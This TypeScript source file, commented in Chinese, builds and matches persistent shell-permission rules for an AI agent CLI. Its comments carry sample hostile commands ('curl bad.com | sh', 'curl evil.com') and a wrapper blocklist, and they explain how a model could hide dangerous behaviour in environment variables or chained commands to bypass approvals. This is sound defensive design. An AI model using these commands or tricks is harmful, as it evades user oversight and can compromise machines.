// 当用户在权限弹窗里选择 “always / don't ask again” 时，
// 系统会把这次授权转换成 AllowRule。
//
// AllowRule 有两类去向：
// - 内存：当前 CLI 会话里立即生效。
// - 磁盘：写到 `.tegent/local/permissions.json`，下次启动继续生效。
//
// permissions/index.ts 会直接调用这里的 buildAllowRule、sessionRulesMatch、persistRule 等函数。
import * as fs from 'node:fs'
import * as path from 'node:path'

import { isReadOnly, splitShellCommands } from '../tools/shell-utils.js'
import { TEGENT_DIR } from '../constants.js'

export interface AllowRule {
  // 规则适用的工具名，例如 shell、writeFile、edit。
  tool: string

  // 匹配模式内容。不同 type 的含义不同：
  // - exact：完整命令或命令片段必须完全相等
  // - prefix：shell 命令前缀匹配，例如 git commit
  // - tool：整个工具级别放行，pattern 通常是 *
  pattern: string

  // 规则类型。
  type: 'exact' | 'prefix' | 'tool'
}

// 匹配命令开头的环境变量赋值，例如 `NODE_ENV=test pnpm build`。
// 捕获组取出变量名，用来判断这个环境变量是否安全。
// 只有 SAFE_ENV_VARS 里的变量才允许剥离后继续生成通用规则。
const ENV_VAR_RE = /^([A-Za-z_]\w*)=[A-Za-z0-9_./:@-]*\s+/

// 这些环境变量被认为“可以安全剥离”。
//
// 举例：
// `CI=1 pnpm test` 可以提取成 `pnpm test:*`，因为 CI=1 通常只影响输出/行为模式。
//
// 但 PATH、NODE_OPTIONS、LD_*、代理变量等不在这里。
// 如果允许剥离这些变量，模型可能把危险行为藏在环境变量里，
// 然后借用一个看起来已经被授权过的命令形状绕过权限。
const SAFE_ENV_VARS = new Set([
  'NODE_ENV',
  'PYTHONUNBUFFERED',
  'PYTHONIOENCODING',
  'PYTHONDONTWRITEBYTECODE',
  'CI',
  'DEBUG',
  'FORCE_COLOR',
  'NO_COLOR',
  'CLICOLOR',
  'CLICOLOR_FORCE',
  'TERM',
  'COLORTERM',
  'LANG',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'LC_TIME',
  'LC_COLLATE',
  'TZ',
  'EDITOR',
  'VISUAL',
  'PAGER',
  'LESS',
])

// 这些是“包装器命令”，不能拿它们当 prefix 规则的锚点。
//
// 例如用户批准过一次 `sudo ls`，绝不能因此自动批准 `sudo rm -rf ...`。
// bash -c / sh -c 也类似：如果不真正解析内部脚本，就不能安全提取 prefix。
//
// 命中这些命令时，前缀提取会返回 null，调用方会退回 exact 精确匹配。
const WRAPPER_BLOCKLIST = new Set([
  'sudo',
  'doas',
  'su',
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'cmd',
  'env',
  'time',
  'nice',
  'ionice',
  'timeout',
  'nohup',
  'xargs',
  'watch',
  'parallel',
  'exec',
  'eval',
])

// 某些命令允许在主命令和子命令之间放全局 flag。
//
// 例如：
// `git -C /tmp commit -m fix`
//
// 真正想提取的是 `git commit`，不是 `git -C`。
// 所以这里记录哪些全局 flag 会吃掉下一个 token，哪些可以跳过。
const GLOBAL_FLAGS: Record<string, { valued: Set<string>; takesPlus?: boolean }> = {
  git: {
    valued: new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path', '--super-prefix']),
  },
  docker: {
    valued: new Set([
      '-H',
      '--host',
      '--config',
      '--context',
      '-c',
      '--log-level',
      '--tlscacert',
      '--tlscert',
      '--tlskey',
    ]),
  },
  podman: {
    valued: new Set(['--connection', '-c', '--log-level', '--root', '--runroot', '--storage-driver', '--url']),
  },
  kubectl: {
    valued: new Set([
      '-n',
      '--namespace',
      '--context',
      '--cluster',
      '--kubeconfig',
      '--server',
      '-s',
      '--user',
      '--token',
      '--as',
      '--as-group',
      '--cache-dir',
      '--certificate-authority',
      '--client-certificate',
      '--client-key',
    ]),
  },
  cargo: {
    valued: new Set(['--config', '-Z', '--color', '--manifest-path']),
    takesPlus: true,
  },
}

// POSIX 风格子命令名。
// 用它过滤掉 `-flag`、`/flag`、路径这类不应该当子命令的 token。
const SUBCOMMAND_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/

// PowerShell Cmdlet 常见形状：Verb-Noun。
// 例如 Get-ChildItem、Sort-Object、Invoke-WebRequest。
//
// PowerShell cmdlet 没有 git/docker 那种“子命令”，所以整个 token 本身就是 prefix。
const VERB_NOUN_CMDLET_RE = /^[A-Z][a-z]+(?:-[A-Z][A-Za-z0-9]*)+$/

// cd/pushd 这类命令只改变目录，通常是“准备动作”，不是权限规则的核心。
//
// 例如：
// `cd D:\foo && npm test`
//
// 应该提取 `npm test`，而不是 `cd`。
// 正则同时覆盖 POSIX 和 PowerShell 的目录切换命令。
const CD_LIKE_RE = /^(?:cd|chdir|pushd|popd|set-location|push-location|pop-location|sl)\b/i

// 判断命令是否是 powershell / pwsh 启动器。
// 后面会专门从 `powershell -Command "..."` 里提取内部命令。
const POWERSHELL_LAUNCHER_RE = /^(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i

// 从 PowerShell 的 -Command 字符串里提取第一个 cmdlet 或普通命令名。
const PS_INNER_CMD_RE = /["']?\s*(?:&\s*\{?\s*)?([A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+|[a-z][a-z0-9._-]*)/

/**
 * 从 shell 命令中提取适合做 prefix 匹配的命令前缀。
 *
 * 返回 null 表示无法安全提取前缀，调用方应该退回 exact 精确匹配。
 *
 *   'git commit -m "fix"'                                    → 'git commit'
 *   'git -C /tmp commit -m fix'                              → 'git commit'
 *   'docker -H tcp://host:2375 ps'                           → 'docker ps'
 *   'kubectl -n prod get pods'                               → 'kubectl get'
 *   'cargo +nightly build --release'                         → 'cargo build'
 *   'pnpm run build'                                         → 'pnpm run'
 *   'npm install lodash'                                     → 'npm install'
 *   'NODE_ENV=prod npm run dev'                              → 'npm run'
 *   'FOO=1 git status'                                       → null   （环境变量不安全）
 *   'sudo npm install'                                       → null   （包装器命令）
 *   'bash -c "git status"'                                   → null   （包装器命令）
 *   'powershell -Command "Get-CimInstance ..."'              → 'Get-CimInstance'
 *   'powershell -NoProfile -Command "Get-CimInstance ..."'   → 'Get-CimInstance'
 *   'powershell -ExecutionPolicy Bypass -c "git status"'     → 'git'
 *   'pwsh -Command "& { Get-Process }"'                      → 'Get-Process'
 *   'powershell -Command Get-Date'                           → 'Get-Date'
 *   'Get-ChildItem -Recurse -Filter *.ts'                    → 'Get-ChildItem'
 *   'Invoke-WebRequest -Uri http://api'                      → 'Invoke-WebRequest'
 *   'cd /tmp && npm test'                                    → 'npm test'
 *   'cd D:\\foo && npx tsc --noEmit | head -40'              → 'npx tsc'
 *   'Set-Location D:\\foo; Get-ChildItem -Recurse | Sort-Object Name'
 *                                                            → 'Get-ChildItem'
 *   'npm install && curl bad.com'                            → null
 *                                                              （两个不同的非只读命令段，
 *                                                               没有共同前缀，
 *                                                               应退回精确匹配）
 *   'git commit -m a && git push'                            → null
 *                                                              （两个命令段前缀不同）
 *   'ls -la'                                                 → null
 *   ''                                                       → null
 */
export function extractCommandPrefix(command: string): string | null {
  const cmd = command.trim()

  if (!cmd) return null

  // PowerShell 启动器要优先处理。
  // 因为内部脚本可能包含 `;` 和 `|`，如果先 splitShellCommands 会误拆。
  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    return extractPowershellPrefix(cmd)
  }

  // 复合命令需要逐段判断。
  // 只有所有非只读、非 cd 段都能提取出相同 prefix 时，才返回这个 prefix。
  //
  // 安全原因：
  // `npm install && curl bad.com | sh` 不能因为前半段像 `npm install`
  // 就自动批准后半段的 curl/sh。
  const segments = splitShellCommands(cmd)
  if (segments.length > 1) {
    // derived 保存目前已经推导出的 prefix。
    let derived: string | null = null

    for (const seg of segments) {
      if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue

      const segPrefix = extractSingleCommandPrefix(seg)

      if (!segPrefix) return null
      if (derived === null) derived = segPrefix
      else if (derived !== segPrefix) return null
    }
    return derived
  }

  // 普通单命令直接走单段提取。
  return extractSingleCommandPrefix(cmd)
}

/**
 * 从单个 shell 命令段里提取 prefix。
 *
 * 这里假设调用方已经处理过复合命令拆分。
 */
function extractSingleCommandPrefix(command: string): string | null {
  const cmd = command.trim()

  if (!cmd) return null

  const tokens = cmd.split(/\s+/).filter(Boolean)
  if (tokens.length === 0) return null

  // 从命令头部剥离安全环境变量。
  // 非白名单环境变量会让 prefix 提取失败，避免危险 env 被伪装进通用授权规则。
  let i = 0
  while (i < tokens.length) {
    const tok = tokens[i]!
    const m = /^([A-Za-z_]\w*)=/.exec(tok)

    if (!m) break

    if (!SAFE_ENV_VARS.has(m[1]!)) return null

    const value = tok.slice(m[0].length)
    if (hasUnclosedQuote(value)) return null

    i++
  }

  // rest 是剥离安全环境变量后的真实命令 token。
  const rest = tokens.slice(i)
  if (rest.length === 0) return null

  // PowerShell cmdlet 自身就是 prefix，不需要第二个子命令。
  if (VERB_NOUN_CMDLET_RE.test(rest[0]!)) {
    return rest[0]!
  }

  // 普通 POSIX 风格命令至少需要 “主命令 + 子命令”，例如 git commit。
  if (rest.length < 2) return null

  // 第一个 token 是主命令。
  const firstLower = rest[0]!.toLowerCase()

  // 包装器命令不适合做 prefix，直接失败。
  if (WRAPPER_BLOCKLIST.has(firstLower)) return null

  // 跳过主命令后面的全局 flags，找到真正子命令的位置。
  const subIdx = skipGlobalFlags(rest, firstLower)
  if (subIdx >= rest.length) return null

  // 子命令必须符合安全形状。
  const sub = rest[subIdx]!
  if (!SUBCOMMAND_RE.test(sub)) return null

  return `${rest[0]} ${sub}`
}

/**
 * 判断字符串里是否有未闭合的单引号或双引号。
 */
function hasUnclosedQuote(s: string): boolean {
  // 单引号计数。
  let sq = 0

  // 双引号计数。
  let dq = 0

  for (const ch of s) {
    if (ch === "'") sq++
    else if (ch === '"') dq++
  }

  // 奇数个引号表示未闭合。
  return sq % 2 === 1 || dq % 2 === 1
}

/**
 * 跳过主命令和子命令之间的全局 flags，返回真正子命令的下标。
 */
function skipGlobalFlags(tokens: string[], firstLower: string): number {
  // 查当前主命令是否有特殊全局 flag 配置。
  const cfg = GLOBAL_FLAGS[firstLower]

  // 没配置时，默认第二个 token 就是子命令。
  if (!cfg) return 1

  // i 从 1 开始，因为 tokens[0] 是主命令。
  let i = 1
  while (i < tokens.length) {
    const tok = tokens[i]!

    // cargo +nightly build 这种 +toolchain 需要跳过。
    if (cfg.takesPlus && tok.startsWith('+')) {
      i++
      continue
    }

    // 不是 flag，就认为找到了子命令。
    if (!tok.startsWith('-')) break

    // --flag=value 是单 token flag，跳过一个。
    if (tok.includes('=')) {
      i++
      continue
    }

    // 带值 flag，例如 git -C /tmp，要跳过 flag 和它的值两个 token。
    if (cfg.valued.has(tok)) {
      i += 2
      continue
    }

    // 未知的 -xxx 按布尔 flag 处理，跳过一个。
    i++
  }
  return i
}

/**
 * 从 powershell/pwsh 启动命令中提取内部命令前缀。
 */
function extractPowershellPrefix(cmd: string): string | null {
  const tokens = cmd.split(/\s+/).filter(Boolean)

  // 第 0 个 token 是 powershell/pwsh 启动器，从第 1 个开始扫描参数。
  // 从下标 1 开始，因为下标 0 是 powershell/pwsh 启动器。
  let i = 1
  while (i < tokens.length) {
    const tok = tokens[i]!

    // 遇到非 flag，说明可能已经到了内部命令。
    if (!tok.startsWith('-')) break
    const lower = tok.toLowerCase()

    // -Command / -c 后面就是内部命令文本。
    if (lower === '-command' || lower === '-c') {
      i++
      break
    }

    // -File 执行的是脚本文件，不安全提取内部 prefix。
    if (lower === '-file') return null

    // 这些 PowerShell 参数会消费后面一个值，所以跳过两个 token。
    if (
      lower === '-executionpolicy' ||
      lower === '-encodedcommand' ||
      lower === '-inputformat' ||
      lower === '-outputformat' ||
      lower === '-version' ||
      lower === '-windowstyle' ||
      lower === '-configurationname' ||
      lower === '-mta' ||
      lower === '-sta'
    ) {
      i += 2
      continue
    }

    i++
  }

  // 没有内部命令可提取。
  if (i >= tokens.length) return null

  // 把剩余 token 重新拼回内部命令字符串。
  const inner = tokens.slice(i).join(' ')

  // 从内部命令里抓第一个 cmdlet 或普通命令名。
  const m = PS_INNER_CMD_RE.exec(inner)
  return m?.[1] ?? null
}

/**
 * 提取复合命令中所有不同的命令前缀。
 *
 * 和 extractCommandPrefix 的区别：
 * - extractCommandPrefix 只在所有有效段前缀相同时返回一个 prefix。
 * - 这个函数会返回每个有效段的不同 prefix。
 *
 * 例如：
 * `git commit && git push` 会返回 `['git commit', 'git push']`。
 *
 * 任意有效命令段无法安全提取 prefix 时返回 null。
 * 当前内部主要使用更完整的 extractCompoundRules；这个导出保留给兼容调用方。
 */
export function extractCompoundPrefixes(command: string): string[] | null {
  const cmd = command.trim()

  if (!cmd) return null

  // PowerShell 启动器作为一个整体处理，避免误拆内部脚本。
  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)

    return p ? [p] : null
  }

  // 把复合 shell 命令拆成多个命令段。
  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()

  // out 保留稳定的首次出现顺序。
  const out: string[] = []

  for (const seg of segments) {
    // 只读命令和目录切换命令不需要形成权限规则。
    if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue

    const p = extractSingleCommandPrefix(seg)

    if (!p) return null

    // 只保存第一次遇到的 prefix。
    if (!seen.has(p)) {
      seen.add(p)
      out.push(p)
    }
  }

  return out.length === 0 ? null : out
}

/**
 * 为复合命令逐段生成 AllowRule。
 *
 * 每个非只读、非 cd 命令段会得到一条规则：
 * - 能提取 prefix：生成 prefix 规则。
 * - 不能提取 prefix：生成该段的 exact 精确规则。
 *
 * 例如：
 * `git commit -m foo && curl evil.com`
 *
 * 会生成：
 * - `{ tool: 'shell', pattern: 'git commit', type: 'prefix' }`
 * - `{ tool: 'shell', pattern: 'curl evil.com', type: 'exact' }`
 *
 * 这样不会因为其中一个命令只能精确匹配，就丢掉另一个可复用的 prefix 规则。
 */
export function extractCompoundRules(command: string): AllowRule[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  // PowerShell 启动器单独处理。
  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)

    // 能提取内部命令时，生成一条 shell prefix 规则。
    return p ? [{ tool: 'shell', pattern: p, type: 'prefix' }] : null
  }

  // 拆分复合命令。
  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()

  const out: AllowRule[] = []

  for (const seg of segments) {
    const trimmed = seg.trim()

    // 只读段和目录切换段不需要用户授权规则。
    if (isReadOnly(trimmed) || CD_LIKE_RE.test(trimmed)) continue

    // 优先尝试生成更通用的 prefix 规则。
    const prefix = extractSingleCommandPrefix(trimmed)
    if (prefix) {
      // key 同时包含规则类型，防止 exact/prefix 同名时误去重。
      const key = `prefix:${prefix}`
      if (!seen.has(key)) {
        seen.add(key)
        out.push({ tool: 'shell', pattern: prefix, type: 'prefix' })
      }

      // 当前段已经生成 prefix 规则，不需要再生成 exact。
      continue
    }

    // 无法生成 prefix 时，退回当前命令段的 exact 精确规则。
    // 如果开头存在非白名单环境变量，则整个规则构建失败，避免放宽权限。
    const headEnv = /^([A-Za-z_]\w*)=/.exec(trimmed)
    if (headEnv && !SAFE_ENV_VARS.has(headEnv[1]!)) return null

    // 剥离安全环境变量，让规则格式保持稳定。
    const exact = stripSafeEnvVars(trimmed)
    if (!exact) return null

    // exact 规则也需要去重。
    const key = `exact:${exact}`
    if (!seen.has(key)) {
      seen.add(key)
      out.push({ tool: 'shell', pattern: exact, type: 'exact' })
    }
  }

  return out.length === 0 ? null : out
}

/**
 * 为权限弹窗里的 “don't ask again / always” 选项生成用户可读文案。
 *
 * 示例：
 * - shell prefix：`git commit:*`
 * - 多段 shell：`git commit:*, git push:*`
 * - 无法提取 prefix：`this exact command`
 * - writeFile/edit：`all edits this session`
 * - MCP：`this MCP tool`
 */
export function suggestRuleLabel(toolName: string, input: Record<string, unknown>, isMcp = false): string | null {
  if (toolName === 'enterPlanMode') return null

  if (isMcp) return 'this MCP tool'

  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''

    const rules = extractCompoundRules(cmd)

    if (!rules || rules.length === 0) return 'this exact command'

    // 如果唯一规则就是完整命令的 exact 匹配，显示简洁的固定文案，
    // 不把整条可能很长的命令重复显示给用户。
    if (rules.length === 1) {
      const r = rules[0]!
      if (r.type === 'exact' && r.pattern === stripSafeEnvVars(cmd)) return 'this exact command'
    }

    // prefix 规则追加 :* 表示“该前缀下的参数变化也匹配”。
    // exact 规则直接显示完整模式。
    return rules.map((r) => (r.type === 'prefix' ? `${r.pattern}:*` : r.pattern)).join(', ')
  }

  // 当前其它走到这里的主要是 writeFile/edit，只在本会话内允许所有编辑。
  return 'all edits this session'
}

/**
 * 把用户的 “always / don't ask again” 决定转换成 AllowRule。
 *
 * shell：
 * - 能拆出 prefix/exact 规则时，返回逐段规则，并允许持久化。
 * - 无法拆出时，退回整条命令 exact 规则，并允许持久化。
 *
 * writeFile/edit：
 * - 返回工具级别规则，只在当前会话有效，不写磁盘。
 *
 * persist 表示调用方是否应该把规则写入 permissions.json。
 */
export function buildAllowRule(
  toolName: string,
  input: Record<string, unknown>,
): { rules: AllowRule[]; persist: boolean } | null {
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''

    const rules = extractCompoundRules(cmd)
    if (rules && rules.length > 0) {
      return { rules, persist: true }
    }

    // 无法逐段构建时，退回整条命令 exact 规则。
    // 只剥离安全环境变量；非白名单变量会保留在 pattern 里。
    const exact = stripSafeEnvVars(cmd)
    if (!exact) return null

    // exact shell 规则同样允许持久化。
    return { rules: [{ tool: toolName, pattern: exact, type: 'exact' }], persist: true }
  }

  // 非 shell 工具目前统一生成工具级别规则。
  // writeFile/edit 的授权只在本次会话有效，所以 persist=false。
  return { rules: [{ tool: toolName, pattern: '*', type: 'tool' }], persist: false }
}

/**
 * 从命令开头剥离白名单中的安全环境变量。
 *
 * 例如：
 * `CI=1 NODE_ENV=test pnpm test` 会变成 `pnpm test`。
 *
 * 遇到非白名单环境变量时停止剥离。
 */
function stripSafeEnvVars(command: string): string {
  let cmd = command.trim()

  while (true) {
    const m = ENV_VAR_RE.exec(cmd)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) break
    cmd = cmd.slice(m[0].length)
  }

  return cmd.trim()
}



/**
 * 把 AllowRule 转成 permissions.json 里保存的字符串格式。
 */
function ruleToString(rule: AllowRule): string {
  // 工具级规则，例如 writeFile:*。
  if (rule.type === 'tool') return `${rule.tool}:*`

  // 前缀规则，例如 shell:git commit:*。
  if (rule.type === 'prefix') return `${rule.tool}:${rule.pattern}:*`

  // 精确规则，例如 shell:=findstr /n foo file。
  return `${rule.tool}:=${rule.pattern}`
}

/**
 * 把 permissions.json 中的规则字符串解析回 AllowRule。
 *
 * 无法识别的格式返回 null，加载时会忽略。
 */
function parseRuleString(s: string): AllowRule | null {
  // tool:* 表示整个工具放行。
  const toolWide = s.match(/^([^:]+):\*$/)
  if (toolWide) return { tool: toolWide[1]!, pattern: '*', type: 'tool' }

  // tool:prefix:* 表示前缀匹配。
  const prefix = s.match(/^([^:]+):(.+):\*$/)
  if (prefix) return { tool: prefix[1]!, pattern: prefix[2]!, type: 'prefix' }

  // tool:=exact 表示精确匹配。
  const exact = s.match(/^([^:]+):=(.+)$/)
  if (exact) return { tool: exact[1]!, pattern: exact[2]!, type: 'exact' }

  // 未知格式忽略。
  return null
}

/**
 * 计算当前项目的权限规则文件路径。
 */
function getPermissionsPath(cwd: string): string {
  // 最终路径是 `<cwd>/.tegent/local/permissions.json`。
  return path.join(cwd, TEGENT_DIR, 'local', 'permissions.json')
}



/**
 * 保存当前 CLI 会话已经批准的权限规则。
 *
 * 这个类只负责内存规则：
 * - addRule：添加规则并去重
 * - matches：判断新的工具调用是否命中已有规则
 * - clear：清空当前会话规则
 *
 * 磁盘规则加载后也会灌进这个 store，所以匹配时不需要区分规则来源。
 */
class SessionPermissionStore {
  // 当前内存中的全部 allow 规则。
  private rules: AllowRule[] = []

  /**
   * 添加一条 allow 规则。
   *
   * 完全相同的 tool/pattern/type 不会重复添加。
   */
  addRule(rule: AllowRule): void {
    const exists = this.rules.some((r) => r.tool === rule.tool && r.pattern === rule.pattern && r.type === rule.type)

    if (!exists) this.rules.push(rule)
  }

  /**
   * 判断一次工具调用是否命中当前保存的 allow 规则。
   */
  matches(toolName: string, input: Record<string, unknown>): boolean {
    if (toolName !== 'shell') {
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue

        if (rule.type === 'tool') return true
      }

      return false
    }

    const cmd = (input.command as string) ?? ''

    // 第一轮匹配：
    // - tool：整个 shell 工具放行
    // - exact：完整命令精确相等
    for (const rule of this.rules) {
      // 只看 shell 规则。
      if (rule.tool !== toolName) continue

      // shell 工具级规则直接命中。
      if (rule.type === 'tool') return true

      // exact 规则和剥离安全环境变量后的完整命令比较。
      if (rule.type === 'exact' && stripSafeEnvVars(cmd) === rule.pattern) return true
    }

    // 第二轮匹配复合命令。
    // 每一个非只读、非 cd 的命令段，都必须分别命中某条 prefix 或 exact 规则。
    //
    // 例如用户只批准过 `git commit:*`：
    // `git commit -m a && curl evil.com` 不能通过，
    // 因为 curl 这一段没有任何匹配规则。
    const segments = splitShellCommands(cmd)

    // 只保留真正需要权限匹配的命令段。
    const checkable = segments.filter((seg) => !isReadOnly(seg) && !CD_LIKE_RE.test(seg.trim()))

    // 没有需要检查的段时不在这里自动批准。
    // 纯只读命令应当在上游权限分类里直接 always-allow。
    if (checkable.length === 0) return false

    // 每个有效命令段都必须命中。
    for (const seg of checkable) {
      // exact 匹配使用剥离安全环境变量后的命令段。
      const segText = stripSafeEnvVars(seg.trim())

      // prefix 匹配使用当前命令段提取出的前缀。
      const segPrefix = extractSingleCommandPrefix(seg)

      // 记录当前命令段是否已命中某条规则。
      let segMatched = false

      // 尝试用全部已有规则匹配当前段。
      for (const rule of this.rules) {
        // 忽略其它工具的规则。
        if (rule.tool !== toolName) continue

        // prefix 规则要求当前段能够提取 prefix。
        if (rule.type === 'prefix' && segPrefix) {
          // 完全等于保存的 prefix，或者当前 prefix 是保存 prefix 的更具体形式时命中。
          if (segPrefix === rule.pattern || segPrefix.startsWith(rule.pattern + ' ')) {
            segMatched = true
            break
          }
        } else if (rule.type === 'exact' && segText === rule.pattern) {
          // 命令段 exact 匹配。
          // 这覆盖复合规则中无法提取 prefix 的部分，例如 `curl evil.com`。
          segMatched = true
          break
        }
      }

      // 只要有一个有效段没命中，整条复合命令就不能自动放行。
      if (!segMatched) return false
    }

    // 所有有效命令段都命中，整条 shell 命令允许执行。
    return true
  }

  /**
   * 清空当前内存中的全部规则。
   *
   * 主要用于新会话初始化和测试隔离。
   * 这里只清内存，不会删除磁盘 permissions.json。
   */
  clear(): void {
    this.rules = []
  }

  /**
   * 返回当前内存规则数量。
   */
  get size(): number {
    return this.rules.length
  }
}

// 模块级单例：整个进程中的权限检查共享这一份会话规则。
const store = new SessionPermissionStore()

/**
 * 向当前会话添加一条 allow 规则。
 */
export function addSessionAllowRule(rule: AllowRule): void {
  store.addRule(rule)
}

/**
 * 判断某次工具调用是否命中当前会话/已加载的持久化规则。
 */
export function sessionRulesMatch(toolName: string, input: Record<string, unknown>): boolean {
  return store.matches(toolName, input)
}

/**
 * 清空当前进程内存中的权限规则。
 *
 * 不会删除磁盘文件。
 */
export function clearSessionRules(): void {
  store.clear()
}



/**
 * 从 `.tegent/local/permissions.json` 加载持久化权限规则。
 *
 * 加载到上面的内存 store 后，后续 sessionRulesMatch 就能直接匹配。
 * 可以重复调用，因为 addRule 会自动去重。
 * 文件不存在、JSON 损坏或字段格式不正确时会静默忽略。
 */
export function loadPersistedRules(cwd: string): void {
  const filePath = getPermissionsPath(cwd)

  let raw: string
  try {
    raw = fs.readFileSync(filePath, 'utf-8')
  } catch {
    return
  }

  let data: { allow?: string[] }
  try {
    data = JSON.parse(raw) as { allow?: string[] }
  } catch {
    return
  }

  if (!Array.isArray(data.allow)) return

  for (const entry of data.allow) {
    if (typeof entry !== 'string') continue
    const rule = parseRuleString(entry)

    if (rule) store.addRule(rule)
  }
}

/**
 * 把一条新规则持久化到 `.tegent/local/permissions.json`。
 *
 * 文件不存在时自动创建；相同规则已经存在时不会重复写入。
 */
export function persistRule(cwd: string, rule: AllowRule): void {
  const filePath = getPermissionsPath(cwd)
  const ruleStr = ruleToString(rule)

  const data: { allow: string[] } = { allow: [] }
  try {
    const raw = fs.readFileSync(filePath, 'utf-8')
    const parsed = JSON.parse(raw) as { allow?: string[] }

    if (Array.isArray(parsed.allow)) {
      data.allow = parsed.allow.filter((s): s is string => typeof s === 'string')
    }
  } catch {
 
  }

  if (data.allow.includes(ruleStr)) return
  data.allow.push(ruleStr)
  const dir = path.dirname(filePath)

  fs.mkdirSync(dir, { recursive: true })

  // permissions.json 记录了用户愿意自动放行哪些命令，
  // 这属于本地安全偏好，不应该进入 Git 历史。
  // 所以第一次写入时，在 `.tegent/local` 下创建内容为 `*` 的 .gitignore。
  const gitignorePath = path.join(dir, '.gitignore')
  if (!fs.existsSync(gitignorePath)) {
    fs.writeFileSync(gitignorePath, '*\n', 'utf-8')
  }

  fs.writeFileSync(filePath, JSON.stringify(data, null, 2) + '\n', 'utf-8')
}
